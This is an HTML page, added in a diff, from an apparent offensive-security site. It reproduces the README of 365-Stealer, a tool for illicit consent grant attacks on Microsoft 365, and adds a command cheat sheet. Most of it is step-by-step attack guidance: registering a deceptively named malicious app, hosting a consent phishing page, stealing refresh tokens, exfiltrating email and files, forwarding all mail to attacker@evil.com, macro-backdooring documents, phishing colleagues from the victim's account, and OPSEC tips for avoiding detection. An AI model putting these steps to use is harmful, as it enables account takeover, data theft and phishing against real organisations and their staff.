@@ -1,0 +1,632 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>365-Stealer - Breachcraft Dev</title>
+<meta name="description" content="Configuring the 365-Stealer Management Portal">
+<link rel="canonical" href="https://breachcraft.dev/tools/365-stealer/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">365-Stealer</p>
+  <h1>365-Stealer</h1>
+  <p class="lede">Configuring the 365-Stealer Management Portal</p>
+  <h2>What it is</h2>
+<h3>Table of Contents</h3>
+<ul>
+<li>About 365-Stealer</li>
+<li>About Illicit Consent Grant Attack</li>
+<li>Key Features of 365-Stealer</li>
+<li>Setup Attacking Environment</li>
+<li>Automated Azure App Registration</li>
+<li>Manual Azure App Registration</li>
+<li>Configuring the Application</li>
+<li>Creating Client Secrets</li>
+<li>Adding API Permissions</li>
+<li>Setting Up 365-Stealer</li>
+<li>Enabling SQLite3 on the Apache Server</li>
+<li>Configuring the 365-Stealer Management Portal</li>
+<li>Modifying Paths</li>
+<li>Enabling IP Whitelisting for the 365-Stealer Management Portal</li>
+<li>OPSEC Consideration</li>
+<li>Command Line Help</li>
+<li>Blog</li>
+<li>Bugs and Feature Requests</li>
+<li>Contributing</li>
+</ul>
+<h3>About</h3>
+<p><strong>365-Stealer</strong> is a Python3-based tool designed to automate illicit consent grant attacks. When a target user unknowingly grants permission to an attacker's application, the attacker gains access to the victim's refresh token. This refresh token can then be used to generate other tokens, allowing the attacker to access sensitive data such as emails, files on OneDrive, and notes—without needing further input from the victim. Manually exploiting this can be time-consuming, but 365-Stealer simplifies and automates the process.</p>
+<h4>365-Stealer comes with 2 interfaces:</h4>
+<ol>
+<li><strong>CLI (Command Line Interface)</strong> - Built entirely in Python3, the CLI provides direct access to the tool’s features.</li>
+<li><strong>Web UI</strong> - The Web User Interface is developed using PHP, while Python3 operates in the background to execute commands.</li>
+</ol>
+<h3>Understanding the Illicit Consent Grant Attack</h3>
+<p>An illicit consent grant attack occurs when an attacker registers a malicious application within Azure, requesting access to sensitive data like contacts, emails, or documents. The attacker deceives a user into consenting to the app, usually by presenting it as legitimate. Once the victim clicks "Accept," they unknowingly provide access to the attacker, allowing them to act on behalf of the victim without needing the victim’s organizational credentials.</p>
+<p>To explain more clearly, once the user grants permission, Entra ID sends a token to the attacker's server. This token gives the attacker the ability to read emails, send emails, access files on OneDrive, and perform other malicious activities using the victim's credentials. Unlike phishing attacks that rely on stealing passwords, illicit consent grant attacks bypass authentication entirely by abusing the permissions system of cloud applications.</p>
+<h3>Key Features of 365-Stealer</h3>
+<ul>
+<li><strong>Steals Refresh Tokens:</strong> The tool captures refresh tokens from victims, which can be used to generate new access tokens for at least 90 days, providing ongoing access to their accounts..</li>
+<li><strong>Send Emails on Behalf of Victims:</strong> 365-Stealer can send emails with attachments from the victim’s account to other users without their knowledge.</li>
+<li><strong>Create Malicious Outlook Rules:</strong> It can create harmful rules in the victim’s Outlook, such as forwarding any incoming mail to an attacker-controlled email.</li>
+<li><strong>Upload Files to OneDrive:</strong> The tool can upload any file into the victim's OneDrive account.</li>
+<li><strong>Steal Data from OneDrive, OneNote, and Email:</strong> 365-Stealer can extract files from OneDrive, OneNote, and dump all emails, including attachments, from the victim’s account.</li>
+<li><strong>Manage Stolen Data:</strong> The 365-Stealer Management Portal allows attackers to manage all compromised data, including refresh tokens, emails, files, and users.</li>
+<li><strong>Backdoor OneDrive Documents:</strong> The tool can backdoor a .docx file stored in OneDrive by injecting malicious macros and replacing the file extension with .doc.</li>
+<li><strong>Store Compromised Data:</strong> All collected information, such as refresh tokens, emails, files, and user data from the victim’s tenant, along with configurations, are stored in a database.</li>
+<li><strong>Customizable Delay for Data Theft:</strong> Attackers can delay requests by specifying a time in seconds to avoid detection while stealing data.</li>
+<li><strong>Host a Phishing Application:</strong> The tool can host a fake application for performing illicit consent grant attacks using the <code>--run-app</code> command in the terminal or via the 365-Stealer Management portal.</li>
+<li><strong>Selective Token Theft:</strong> Using the <code>--no-stealing</code> flag, the tool can steal only the tokens without further actions, allowing attackers to exploit them later.</li>
+<li><strong>Request New Access Tokens:</strong> The tool allows attackers to request new access tokens for all users or specific users within the compromised tenant.</li>
+<li><strong>Generate Access Tokens Using Credentials:</strong> With the --refresh-token, <code>--client-id</code>, and <code>--client-secret</code> flags, attackers can easily obtain new access tokens.</li>
+<li><strong>Automate Azure App Registration:</strong> The <code>--app-registration</code> flag automates the process of Azure app registration, making it easier to set up the attack infrastructure without manual intervention.</li>
+<li><strong>Selective Data Theft:</strong> With the <code>--custom-steal</code> flag, attackers can selectively steal data from specific sources like OneDrive, Outlook, etc.</li>
+<li><strong>Shared Data:</strong> All compromised data is saved in a database.db file, which can be shared with our team to use the existing stolen tokens and data.</li>
+<li><strong>Search and Filter Emails:</strong> Attackers can search for specific emails by keyword, subject, user’s email address, or filter emails with attachments using the 365-Stealer Management portal.</li>
+<li><strong>Export User Data:</strong> The tool allows attackers to dump user information from the compromised tenant and export the data to a CSV file for further analysis or use.</li>
+</ul>
+<h3>Setting Up the Attack Environment</h3>
+<h4>Automated Azure App Registration</h4>
+<p>To automatically register an application in Azure using the provided Python script, follow these steps:</p>
+<ol>
+<li>Ensure you have Python3 installed on your machine.</li>
+<li>Clone the 365-Stealer repository:</li>
+</ol>
+<pre><code>   git clone https://github.com/AlteredSecurity/365-Stealer.git
+   cd 365-Stealer</code></pre>
+<ol>
+<li>Install the required Python modules:</li>
+</ol>
+<pre><code>   pip install -r requirements.txt</code></pre>
+<ol>
+<li>Run the automated Azure app registration script:</li>
+</ol>
+<pre><code>   python 365-Stealer.py --app-registration</code></pre>
+<ul>
+<li>The script will prompt you to provide your Azure tenant ID, the desired application name, and the redirect URI.</li>
+<li>You will also choose an authentication method (OAuth with Client Secret or Device Code Flow) and set API permissions (either default, LowImpact or custom permissions).</li>
+<li>Follow the prompts to complete the app registration process.</li>
+</ul>
+<h4>Manual Azure App Registration</h4>
+<p>If you prefer to manually register an Azure application, follow these steps:</p>
+<ol>
+<li><strong>Log in to the Azure Portal:</strong> Go to <code>https://portal.azure.com</code> and sign in to your account.</li>
+<li><strong>Navigate to Microsoft Entra ID:</strong> From the portal, navigate to Microsoft Entra ID.</li>
+<li><strong>Go to App Registrations:</strong> Click on <code>App registrations</code> in the left-hand menu.</li>
+<li><strong>Create a New Registration:</strong> Click on <code>New registration</code> to begin the process of registering a new application.</li>
+<li><strong>Provide Application Details:</strong></li>
+</ol>
+<ul>
+<li><strong>Name:</strong> Enter a name for your application. This name will be shown to the user during the consent process.</li>
+<li><strong>Supported Account Types:</strong> Select <code>Accounts in any organizational directory (Any Microsoft Entra ID tenant - Multitenant)</code>.</li>
+</ul>
+<ol>
+<li><strong>Set the Redirect URI:</strong></li>
+</ol>
+<ul>
+<li>Provide the redirect URI that points to your 365-Stealer phishing page. The format should be <code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>, where your domain or IP corresponds to where you will host the 365-Stealer application.</li>
+</ul>
+<ol>
+<li><strong>Complete the Registration:</strong></li>
+</ol>
+<ul>
+<li>Once all details are entered, click <code>Register</code> to create the application.</li>
+</ul>
+<h4>Configuring the Application</h4>
+<h4>Creating Client Secrets</h4>
+<ol>
+<li><strong>Navigate to Certificates &amp; Secrets:</strong></li>
+</ol>
+<ul>
+<li>In the Azure portal, go to the <code>Certificates &amp; secrets</code> section under your registered application.</li>
+</ul>
+<ol>
+<li><strong>Create a New Client Secret:</strong></li>
+</ol>
+<ul>
+<li>Click on <code>New client secret</code>, provide a description for the secret, and then click Add.</li>
+</ul>
+<ol>
+<li><strong>Save the Secret Value:</strong></li>
+</ol>
+<ul>
+<li>Once created, copy and store the secret's value in a safe location, as you won’t be able to retrieve it again after you leave the page.</li>
+</ul>
+<h4>Adding API Permissions</h4>
+<ol>
+<li><strong>Go to API Permissions:</strong></li>
+</ol>
+<ul>
+<li>In the Azure portal, click on the <code>API permissions</code> tab under your application.</li>
+</ul>
+<ol>
+<li><strong>Add Permissions:</strong></li>
+</ol>
+<ul>
+<li>Click <code>Add a permission</code> to begin selecting the necessary permissions.</li>
+</ul>
+<ol>
+<li><strong>Select Microsoft Graph:</strong></li>
+</ol>
+<ul>
+<li>Under the available APIs, select <code>Microsoft Graph</code>.</li>
+</ul>
+<ol>
+<li><strong>Choose Delegated Permissions:</strong></li>
+</ol>
+<ul>
+<li>In the next step, click on <code>Delegated permissions</code> to assign permissions that will act on behalf of the signed-in user.</li>
+</ul>
+<ol>
+<li><strong>Select Required Permissions:</strong></li>
+<li>Contacts.Read</li>
+<li>Mail.Read</li>
+<li>Notes.Read.All</li>
+<li>Mailboxsettings.ReadWrite</li>
+<li>Files.ReadWrite.All</li>
+<li>Mail.Send</li>
+<li>User.ReadBasic.All</li>
+</ol>
+<h3>Setting Up 365-Stealer</h3>
+<h4>Step-by-Step Instructions</h4>
+<ol>
+<li><strong>Clone the 365-Stealer Repository:</strong></li>
+</ol>
+<blockquote><p>git clone <a href="https://github.com/AlteredSecurity/365-Stealer.git">https://github.com/AlteredSecurity/365-Stealer.git</a></p></blockquote>
+<ol>
+<li><strong>Install Required Applications:</strong></li>
+</ol>
+<blockquote><p><a href="https://www.python.org/downloads/">Python3</a></p></blockquote>
+<blockquote><p><a href="https://www.apachefriends.org/index.html">XAMPP</a></p></blockquote>
+<ol>
+<li><strong>Extract and Save the Files:</strong></li>
+</ol>
+<ul>
+<li>After cloning, copy the <strong>365-Stealer</strong> folder and place them in <code>C:\xampp\htdocs\</code> that allows you to host the PHP application and run Python.</li>
+</ul>
+<ol>
+<li><strong>Install Python Dependencies:</strong> Run the following command to install the necessary Python libraries.</li>
+</ol>
+<pre><code>   cd C:\xampp\htdocs\365-Stealer
+   pip install -r requirements.txt</code></pre>
+<ol>
+<li><strong>Follow Additional Setup Instructions:</strong> After installing the required applications and dependencies, make sure to follow the instructions provided in the <code>yoursVictims/Readme.md</code> file. This will guide you through setting up the necessary databases and tables for 365-Stealer to function properly.</li>
+</ol>
+<h3>Configuring the 365-Stealer Management Portal</h3>
+<h4>Modifying Paths</h4>
+<ol>
+<li>Adjust the Script Paths:</li>
+</ol>
+<ul>
+<li>If necessary, modify the paths for <code>365-Stealer.py</code>, the database, and python3 in the index.php file located at <code>C:/xampp/htdocs/yourvictims/</code>.</li>
+</ul>
+<ol>
+<li>Handling Spaces in File Paths:</li>
+</ol>
+<ul>
+<li>If Python is installed in a directory with spaces in the path (e.g., "Program Files"), make sure to enclose the path in quotes. For example:</li>
+</ul>
+<pre><code>
+&lt;img src="https://github.com/AlteredSecurity/365-Stealer/blob/master/Images/Management-config-2.png" alt="Managemeent Config" border="0"&gt;
+
+### Enabling IP Whitelisting for the 365-Stealer Management Portal
+
+1. Default Whitelisting:
+
+   - By default, IP whitelisting is enabled, and the Management Portal can only be accessed from localhost.
+
+2. Adding Remote IPs:
+
+   - If you want to allow access from a remote IP, you can add the desired IP address in the configuration.
+
+3. Disabling IP Whitelisting:
+
+   - If you wish to disable IP whitelisting entirely, set $enableIpWhiteList = false; in the configuration file.
+
+&lt;img src="https://github.com/AlteredSecurity/365-Stealer/blob/master/Images/management-config-3.png" alt="Managemeent Config" border="0"&gt;
+
+## OPSEC Consideration
+
+**Access Restrictions:** For security reasons, always restrict access to the 365-Stealer Management Portal to infrastructure that you control.
+
+**Avoid Public Exposure:** Never expose the 365-Stealer Management Portal directly to the internet. Ensure it is only accessible through secure, private networks to avoid potential compromise.
+
+## Command Line Help
+</code></pre>
+<p>usage: 365-Stealer.py [-h] [--app-registration] [--set-config] [--get-config] [--code CODE] [--token TOKEN] [--client-id CLIENT_ID] [--client-secret CLIENT_SECRET] [--refresh-token REFRESH_TOKEN] [--token-path TOKEN_PATH] [--refresh-all] [--refresh-user REFRESH_USER] [--redirect-url REDIRECT_URL] [--database-path DATABASE_PATH] [--no-stealing] [--upload UPLOAD] [--create-rules CREATE_RULES] [--send-mail SEND_MAIL] [--delete-all-data] [--delete-user-data DELETE_USER_DATA] [--run-app] [--no-ssl] [--port PORT] [--disable-logs] [--injection] [--custom-steal {listusers,checklicence,outlook,onedrive,onenote} [{listusers,checklicence,outlook,onedrive,onenote} ...]] [--delay DELAY] optional arguments: -h, --help            show this help message and exit --app-registration    Azure App Registration --set-config          Set 365-Stealer Configuration --get-config          Get 365-Stealer Configuration --code CODE           Provide Authorization Code --token TOKEN         Provide Access Token --client-id CLIENT_ID Provide Application Client ID --client-secret CLIENT_SECRET Provide Application Client Secret --refresh-token REFRESH_TOKEN Provide Refresh Token --token-path TOKEN_PATH Provide Access Token file path --refresh-all         Steal all user's data again. --refresh-user REFRESH_USER Steal particular user's data again.(Provide EmailID) --redirect-url REDIRECT_URL Redirect Url --database-path DATABASE_PATH Provide Database Path --no-stealing         Steal only Tokens --upload UPLOAD       Add files in victim's OneDrive(Provide File Path) --create-rules CREATE_RULES Provide json file containing outlook rules --send-mail SEND_MAIL Provide json file to send email --delete-all-data     Delete all data from the database! --delete-user-data DELETE_USER_DATA Delete specific user data from the database! --run-app             Host the Phising App --no-ssl              Use http(port 80) --port PORT           Provide custom port to Host the Phishing App --disable-logs        Disable all http access logs --custom-steal {listusers,checklicence,outlook,onedrive,onenote} [{listusers,checklicence,outlook,onedrive,onenote} ...] Steal specific data --injection           Enable Macro Injection --delay DELAY         Delay the request by specifying time in seconds while stealing</p>
+<pre><code>
+## Blog
+### [Initial Access Attack in Azure – Understanding and Executing the Illicit Consent Grant Attack in 2025](https://www.alteredsecurity.com/post/initial-access-attack-in-azure-understanding-and-executing-the-illicit-consent-grant-attack-in-202) 
+Blog post for the new version of 365-stealder, which is a ground-up rewrite of the older one. This post explores how Illicit Consent Grant (ICG) attack works in Microsoft 365.
+
+The old blog post - [Introduction to 365-Stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
+
+
+## Bugs and Feature Requests
+
+Please raise an issue if you encounter a bug or have a feature request.
+
+## Contributing
+
+If you want to contribute to a project and make it better, your help is very welcome.
+</code></pre>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> Python3 Tool with Web UI</li><li><strong>Purpose</strong> Automate illicit consent grant attacks against Azure AD/Microsoft 365</li><li><strong>Platform</strong> Windows (XAMPP), Linux</li><li><strong>Tags</strong> #azure #m365 #python #phishing #consent-grant #initial-access #persistence #exfiltration</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Clone repository
+git clone https://github.com/AlteredSecurity/365-Stealer.git
+cd 365-Stealer
+
+# Install dependencies
+pip install -r requirements.txt
+
+# For web UI (Windows with XAMPP)
+# Copy to C:\xampp\htdocs\365-Stealer
+# Follow yoursVictims/Readme.md for database setup</code></pre>
+<h3>Quick Reference (Most Common Commands)</h3>
+<pre><code># Automated Azure app registration
+python 365-Stealer.py --app-registration
+
+# Set configuration
+python 365-Stealer.py --set-config
+
+# Host phishing application
+python 365-Stealer.py --run-app
+
+# Steal with authorization code
+python 365-Stealer.py --code &lt;auth-code&gt;
+
+# Steal only tokens (no data exfiltration)
+python 365-Stealer.py --code &lt;auth-code&gt; --no-stealing
+
+# Refresh all user data
+python 365-Stealer.py --refresh-all</code></pre>
+<h3>INITIAL-ACCESS: App Registration &amp; Setup</h3>
+<h4>INITIAL-ACCESS: Automated App Registration</h4>
+<p><strong>Use Case:</strong> Quickly register malicious Azure application</p>
+<pre><code># Automated registration (interactive)
+python 365-Stealer.py --app-registration
+
+# Prompts for:
+# - Azure Tenant ID
+# - Application name
+# - Redirect URI
+# - Authentication method (OAuth/Device Code)
+# - API permissions (default/LowImpact/custom)</code></pre>
+<h4>INITIAL-ACCESS: Manual App Registration</h4>
+<p><strong>Use Case:</strong> Manual control over app registration</p>
+<pre><code>1. Login to https://portal.azure.com
+2. Navigate to Microsoft Entra ID → App registrations
+3. Click "New registration"
+4. Name: Choose convincing name (e.g., "Microsoft Security Update")
+5. Account types: "Accounts in any organizational directory (Multitenant)"
+6. Redirect URI: https://&lt;YOUR-DOMAIN&gt;:&lt;PORT&gt;/login/authorized
+7. Click "Register"</code></pre>
+<h4>INITIAL-ACCESS: Configure App Permissions</h4>
+<p><strong>Use Case:</strong> Set delegated permissions for the malicious app</p>
+<p><strong>Required Delegated Permissions:</strong></p>
+<ul>
+<li>Contacts.Read</li>
+<li>Mail.Read</li>
+<li>Notes.Read.All</li>
+<li>MailboxSettings.ReadWrite</li>
+<li>Files.ReadWrite.All</li>
+<li>Mail.Send</li>
+<li>User.ReadBasic.All</li>
+</ul>
+<pre><code>1. Go to API permissions → Add a permission
+2. Select Microsoft Graph → Delegated permissions
+3. Add the permissions listed above
+4. Create client secret: Certificates &amp; secrets → New client secret</code></pre>
+<h4>INITIAL-ACCESS: Configure 365-Stealer</h4>
+<p><strong>Use Case:</strong> Set up tool configuration</p>
+<pre><code># Interactive configuration
+python 365-Stealer.py --set-config
+
+# Get current configuration
+python 365-Stealer.py --get-config
+
+# Manual config options
+--client-id CLIENT_ID
+--client-secret CLIENT_SECRET
+--redirect-url REDIRECT_URL
+--database-path DATABASE_PATH</code></pre>
+<h3>INITIAL-ACCESS: Phishing Campaign</h3>
+<h4>INITIAL-ACCESS: Host Phishing Application</h4>
+<p><strong>Use Case:</strong> Deploy consent phishing page</p>
+<pre><code># Host with HTTPS (default port 443)
+python 365-Stealer.py --run-app
+
+# Host with HTTP (port 80)
+python 365-Stealer.py --run-app --no-ssl
+
+# Custom port
+python 365-Stealer.py --run-app --port 8443
+
+# Disable access logs (stealth)
+python 365-Stealer.py --run-app --disable-logs</code></pre>
+<h4>INITIAL-ACCESS: Phishing URL Format</h4>
+<p><strong>Use Case:</strong> Generate consent URL for victims</p>
+<pre><code>https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
+  client_id=&lt;YOUR-CLIENT-ID&gt;
+  &amp;response_type=code
+  &amp;redirect_uri=https://&lt;YOUR-DOMAIN&gt;/login/authorized
+  &amp;scope=openid%20profile%20offline_access%20Mail.Read%20Files.ReadWrite.All</code></pre>
+<h3>CRED: Token Theft &amp; Management</h3>
+<h4>CRED: Steal Tokens from Authorization Code</h4>
+<p><strong>Use Case:</strong> Convert auth code to refresh token</p>
+<pre><code># Full data theft
+python 365-Stealer.py --code &lt;authorization-code&gt;
+
+# Steal only tokens (no exfiltration)
+python 365-Stealer.py --code &lt;auth-code&gt; --no-stealing
+
+# Specify redirect URL
+python 365-Stealer.py --code &lt;auth-code&gt; --redirect-url https://your-site.com/callback</code></pre>
+<h4>CRED: Generate Access Tokens from Refresh Token</h4>
+<p><strong>Use Case:</strong> Create new access tokens from stolen refresh token</p>
+<pre><code># Using refresh token
+python 365-Stealer.py --refresh-token &lt;refresh-token&gt; --client-id &lt;client-id&gt; --client-secret &lt;client-secret&gt;
+
+# From token file
+python 365-Stealer.py --token-path /path/to/token.json</code></pre>
+<h4>CRED: Refresh Stolen User Data</h4>
+<p><strong>Use Case:</strong> Re-steal data from already compromised users</p>
+<pre><code># Refresh all users
+python 365-Stealer.py --refresh-all
+
+# Refresh specific user
+python 365-Stealer.py --refresh-user victim@company.com</code></pre>
+<h3>EXFIL: Data Exfiltration</h3>
+<h4>EXFIL: Selective Data Theft</h4>
+<p><strong>Use Case:</strong> Steal specific types of data</p>
+<pre><code># List users only
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal listusers
+
+# Check license information
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal checklicence
+
+# Steal emails only
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal outlook
+
+# Steal OneDrive files only
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal onedrive
+
+# Steal OneNote data
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal onenote
+
+# Multiple sources
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal outlook onedrive onenote
+
+# Add delay between requests (OPSEC)
+python 365-Stealer.py --code &lt;auth-code&gt; --custom-steal outlook --delay 5</code></pre>
+<h4>EXFIL: Full Data Exfiltration</h4>
+<p><strong>Use Case:</strong> Steal all accessible data</p>
+<pre><code># Steal everything with default rate
+python 365-Stealer.py --code &lt;authorization-code&gt;
+
+# Steal with delay (anti-detection)
+python 365-Stealer.py --code &lt;auth-code&gt; --delay 10</code></pre>
+<h3>PERSIST: Persistence Mechanisms</h3>
+<h4>PERSIST: Create Malicious Outlook Rules</h4>
+<p><strong>Use Case:</strong> Forward emails to attacker-controlled address</p>
+<pre><code># Create rules from JSON file
+python 365-Stealer.py --create-rules rules.json --token &lt;access-token&gt;</code></pre>
+<p><strong>Example rules.json:</strong></p>
+<pre><code>{
+  "displayName": "Forward All Mail",
+  "sequence": 1,
+  "isEnabled": true,
+  "conditions": {
+    "subjectContains": []
+  },
+  "actions": {
+    "forwardTo": [
+      {
+        "emailAddress": {
+          "address": "attacker@evil.com"
+        }
+      }
+    ],
+    "stopProcessingRules": true
+  }
+}</code></pre>
+<h4>PERSIST: Backdoor OneDrive Documents</h4>
+<p><strong>Use Case:</strong> Inject macros into .docx files</p>
+<pre><code># Enable macro injection when stealing
+python 365-Stealer.py --code &lt;auth-code&gt; --injection
+
+# Backdoors .docx files with macros and converts to .doc</code></pre>
+<h3>EXEC: Post-Exploitation Actions</h3>
+<h4>EXEC: Send Email as Victim</h4>
+<p><strong>Use Case:</strong> Send phishing emails from compromised account</p>
+<pre><code># Send email from JSON file
+python 365-Stealer.py --send-mail email.json --token &lt;access-token&gt;</code></pre>
+<p><strong>Example email.json:</strong></p>
+<pre><code>{
+  "message": {
+    "subject": "Urgent: Password Reset Required",
+    "body": {
+      "contentType": "HTML",
+      "content": "&lt;h1&gt;Click here to reset password&lt;/h1&gt;"
+    },
+    "toRecipients": [
+      {
+        "emailAddress": {
+          "address": "target@company.com"
+        }
+      }
+    ]
+  },
+  "saveToSentItems": "false"
+}</code></pre>
+<h4>EXEC: Upload Files to Victim's OneDrive</h4>
+<p><strong>Use Case:</strong> Plant malicious files or backdoors</p>
+<pre><code># Upload file to OneDrive
+python 365-Stealer.py --upload /path/to/malicious.exe --token &lt;access-token&gt;
+
+# Upload with token file
+python 365-Stealer.py --upload payload.docm --token-path ./tokens/victim.json</code></pre>
+<h3>Database &amp; Data Management</h3>
+<h4>View Stolen Data via Web UI</h4>
+<p><strong>Use Case:</strong> Browse exfiltrated data</p>
+<pre><code># Access management portal
+http://localhost/365-Stealer/yoursVictims/
+
+# Features:
+- View stolen tokens
+- Browse emails with search/filter
+- Download OneDrive files
+- Export user data to CSV
+- Manage multiple victims</code></pre>
+<h4>Delete Data from Database</h4>
+<p><strong>Use Case:</strong> Clean up after operation</p>
+<pre><code># Delete all data
+python 365-Stealer.py --delete-all-data
+
+# Delete specific user data
+python 365-Stealer.py --delete-user-data victim@company.com</code></pre>
+<h4>Share Database with Team</h4>
+<p><strong>Use Case:</strong> Collaborate on compromised data</p>
+<pre><code># database.db file contains:
+- Refresh tokens
+- Access tokens
+- Stolen emails
+- OneDrive files
+- User information
+
+# Copy database.db to share with team</code></pre>
+<h3>Attack Patterns</h3>
+<h4>Pattern: Initial Consent Grant → Full Data Theft</h4>
+<pre><code># 1. Register malicious app
+python 365-Stealer.py --app-registration
+
+# 2. Host phishing page
+python 365-Stealer.py --run-app
+
+# 3. Send phishing link to victims
+# (Social engineering via email/Teams/SMS)
+
+# 4. When victim grants consent, steal everything
+python 365-Stealer.py --code &lt;auth-code-from-callback&gt;
+
+# 5. Access stolen data
+# Open http://localhost/365-Stealer/yoursVictims/</code></pre>
+<h4>Pattern: Token-Only Theft → Delayed Exploitation</h4>
+<pre><code># 1. Host phishing app
+python 365-Stealer.py --run-app
+
+# 2. Steal only tokens initially (stealth)
+python 365-Stealer.py --code &lt;auth-code&gt; --no-stealing
+
+# 3. Later, exfiltrate data with delays
+python 365-Stealer.py --refresh-user victim@company.com --delay 30 --custom-steal outlook onedrive</code></pre>
+<h4>Pattern: Persistence via Email Rules</h4>
+<pre><code># 1. Get initial access
+python 365-Stealer.py --code &lt;auth-code&gt; --no-stealing
+
+# 2. Create forwarding rule
+python 365-Stealer.py --create-rules forward-all.json --token-path ./tokens/victim.json
+
+# 3. Tokens expire after 90 days, but forwarding persists
+# Monitor attacker@evil.com for forwarded emails</code></pre>
+<h4>Pattern: Lateral Movement via Sent Email</h4>
+<pre><code># 1. Compromise initial victim
+python 365-Stealer.py --code &lt;auth-code&gt;
+
+# 2. Send phishing to colleagues from victim's account
+python 365-Stealer.py --send-mail internal-phish.json --token-path ./victim1.json
+
+# 3. Compromise additional users
+python 365-Stealer.py --code &lt;victim2-auth-code&gt;</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Refresh Token Lifetime</strong>: Tokens valid for 90+ days - long-term access 💡 <strong>No Credential Needed</strong>: Bypasses password authentication entirely 💡 <strong>Multi-Tenant Apps</strong>: Can compromise users from ANY Azure AD tenant 💡 <strong>Application Names</strong>: Use convincing names like "Microsoft Security Update" or "Office 365 Admin Tools" 💡 <strong>Delay Requests</strong>: Use <code>--delay</code> flag to avoid rate limiting and detection 💡 <strong>Email Rules</strong>: More persistent than tokens, harder to detect 💡 <strong>Database Sharing</strong>: Share database.db with team to use same compromised tokens 💡 <strong>Macro Injection</strong>: <code>--injection</code> flag backdoors .docx files automatically 💡 <strong>Custom Permissions</strong>: Request only what you need to reduce suspicion during consent 💡 <strong>Web UI</strong>: Management portal easier for browsing large amounts of stolen data</p>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>Hosting phishing page on suspicious domains</li>
+<li>Requesting excessive API permissions (use LowImpact preset)</li>
+<li>Rapid data exfiltration without delays</li>
+<li>Exposing management portal to internet</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>Creating Outlook rules (generates audit logs)</li>
+<li>Sending emails from compromised accounts</li>
+<li>Uploading files to OneDrive</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>Using <code>--no-stealing</code> initially (only tokens)</li>
+<li>Adding delays with <code>--delay</code> flag</li>
+<li>Using realistic application names</li>
+<li>Requesting minimal permissions</li>
+<li>Selective data theft with <code>--custom-steal</code></li>
+</ul>
+<p><strong>Access Restrictions:</strong></p>
+<ul>
+<li>NEVER expose management portal directly to internet</li>
+<li>Use IP whitelisting (enabled by default for localhost)</li>
+<li>Restrict access to controlled infrastructure only</li>
+</ul>
+<h3>Configuration Files</h3>
+<h4>Management Portal Configuration</h4>
+<p><strong>Location:</strong> <code>C:/xampp/htdocs/365-Stealer/yourvictims/index.php</code></p>
+<pre><code>// Modify paths for your environment
+$pythonPath = "C:/Python/python.exe";  // or python3
+$scriptPath = "C:/xampp/htdocs/365-Stealer/365-Stealer.py";
+$databasePath = "C:/xampp/htdocs/365-Stealer/database.db";
+
+// IP Whitelisting
+$enableIpWhiteList = true;
+$allowedIPs = array('127.0.0.1', 'YOUR-IP-HERE');</code></pre>
+<h4>Apache Configuration (XAMPP)</h4>
+<p><strong>Enable SQLite3:</strong></p>
+<pre><code># In php.ini, uncomment:
+extension=sqlite3</code></pre>
+<h3>Key Features Reference</h3>
+<p><strong>Steals:</strong></p>
+<ul>
+<li>Refresh tokens (90+ day validity)</li>
+<li>Emails (all folders, with attachments)</li>
+<li>OneDrive files</li>
+<li>OneNote notebooks</li>
+<li>Contact lists</li>
+</ul>
+<p><strong>Actions:</strong></p>
+<ul>
+<li>Send emails on behalf of victim</li>
+<li>Create malicious Outlook rules</li>
+<li>Upload files to victim's OneDrive</li>
+<li>Backdoor .docx files with macros</li>
+<li>Request new access tokens</li>
+</ul>
+<p><strong>Management:</strong></p>
+<ul>
+<li>Web UI for browsing stolen data</li>
+<li>Search and filter emails</li>
+<li>Export user data to CSV</li>
+<li>Database sharing with team</li>
+<li>Selective data theft options</li>
+</ul>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/AlteredSecurity/365-Stealer">https://github.com/AlteredSecurity/365-Stealer</a></li>
+<li>Blog: <a href="https://www.alteredsecurity.com/post/introduction-to-365-stealer">https://www.alteredsecurity.com/post/introduction-to-365-stealer</a></li>
+<li>Latest Blog (2025): <a href="https://www.alteredsecurity.com/post/initial-access-attack-in-azure-understanding-and-executing-the-illicit-consent-grant-attack-in-202">https://www.alteredsecurity.com/post/initial-access-attack-in-azure-understanding-and-executing-the-illicit-consent-grant-attack-in-202</a></li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
